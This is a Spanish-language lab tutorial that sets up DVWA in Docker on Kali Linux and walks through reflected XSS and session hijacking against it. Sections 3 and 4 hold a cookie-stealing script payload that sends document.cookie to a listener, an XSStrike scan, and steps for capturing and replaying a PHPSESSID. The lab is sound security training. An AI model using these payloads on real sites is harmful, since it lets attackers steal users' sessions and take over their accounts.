![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **Explotación de XSS y Seguridad en la Gestión de Sesiones con DVWA en Kali Linux**

En esta práctica, instalaremos **Docker en Kali Linux** y configuraremos **Damn Vulnerable Web Application (DVWA)**, una aplicación web diseñada para probar vulnerabilidades de seguridad. Luego, realizaremos pruebas de **Cross-Site Scripting (XSS) y gestión de sesiones** utilizando herramientas de Kali Linux.

------

## **1. Instalación de Docker en Kali Linux**

Docker permite ejecutar contenedores con entornos preconfigurados, lo que facilita el despliegue de aplicaciones vulnerables para pruebas de seguridad.

### **📌 Paso 1: Actualizar el sistema**

Antes de instalar Docker, asegurémonos de que el sistema está actualizado.

```bash
sudo apt update && sudo apt upgrade -y
```

### **📌 Paso 2: Instalar dependencias necesarias**

```bash
sudo apt install apt-transport-https ca-certificates curl software-properties-common -y
```

### **📌 Paso 3: Agregar el repositorio oficial de Docker**

```bash
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo tee /usr/share/keyrings/docker-archive-keyring.gpg >/dev/null
echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
```

### **📌 Paso 4: Instalar Docker**

```bash
sudo apt update
sudo apt install docker-ce docker-ce-cli containerd.io -y
```

### **📌 Paso 5: Verificar la instalación**

```bash
docker --version
```

Debería mostrar una salida similar a:

```bash
Docker version 24.0.5, build 123456
```

### **📌 Paso 6: Habilitar y verificar el servicio**

```bash
sudo systemctl start docker
sudo systemctl enable docker
sudo systemctl status docker
```

Si ves una salida como **"active (running)"**, Docker está instalado y funcionando.

------

## **2. Instalación de DVWA con Docker**

Ahora que Docker está listo, desplegaremos **Damn Vulnerable Web Application (DVWA)**, una aplicación con múltiples vulnerabilidades intencionales.

### **📌 Paso 1: Descargar la imagen de DVWA**

```bash
docker pull vulnerables/web-dvwa
```

Esto descargará la imagen oficial de DVWA.

### **📌 Paso 2: Ejecutar el contenedor**

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

Este comando ejecutará DVWA en el puerto `80` de Kali Linux.

### **📌 Paso 3: Acceder a DVWA en el navegador**

Abre tu navegador y visita:

```bash
http://localhost
```

Debería aparecer la interfaz de login de DVWA.

### **📌 Paso 4: Iniciar sesión en DVWA**

- Usuario: `admin`
- Contraseña: `password`
- En la configuración de DVWA, establece el **Security Level** en **Low**.

------

## **3. Práctica: Explotación de XSS con DVWA y Kali Linux**

### **📌 Escenario**

El atacante intenta explotar una vulnerabilidad **Cross-Site Scripting (XSS)** en la sección de comentarios de DVWA.

### **📌 Paso 1: Identificación de la vulnerabilidad**

1. Navega a `http://localhost/vulnerabilities/xss_r/`

2. Ingresa el siguiente payload en el cuadro de comentarios:

   ```html
   <script>alert('XSS encontrado');</script>
   ```

3. Si el mensaje aparece en pantalla, la aplicación es vulnerable a **XSS reflejado**.

### **📌 Paso 2: Ataque con robo de cookies**

1. En una terminal, inicia un servidor HTTP para recibir la cookie de la víctima:

   ```bash
   python3 -m http.server 8080
   ```

2. En el cuadro de comentarios de DVWA, ingresa el siguiente código malicioso:

   ```html
   <script>document.location='http://localhost:8080/?cookie='+document.cookie;</script>
   ```

3. Cuando otro usuario visite la página, su cookie será enviada al atacante.

### **📌 Paso 3: Uso de XSStrike para automatizar el ataque**

**XSStrike** es una herramienta avanzada en Kali Linux para identificar y explotar XSS.

```bash
xsstrike -u "http://localhost/vulnerabilities/xss_r/?name="
```

Esto analizará la aplicación en busca de vulnerabilidades XSS más avanzadas.

------

## **4. Práctica: Seguridad en la Gestión de Sesiones**

Las sesiones mal gestionadas pueden permitir a un atacante **secuestrar cuentas**.

### **📌 Paso 1: Intercepción de cookies con Burp Suite**

1. Abrir Burp Suite

    en Kali Linux:

   ```bash
   burpsuite &
   ```

2. Activar el **proxy** y configurar el navegador para usarlo.

3. Iniciar sesión en DVWA y capturar la cookie de sesión en Burp Suite.

### **📌 Paso 2: Reutilización de sesión**

1. Copiar la cookie interceptada en Burp Suite.

2. Abrir un navegador en modo incógnito.

3. En la consola del navegador, ejecutar:

   ```js
   document.cookie = "PHPSESSID=VALOR_OBTENIDO; security=low";
   ```

4. Refrescar la página. Si la sesión se mantiene, la aplicación **es vulnerable** a secuestro de sesiones.



![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)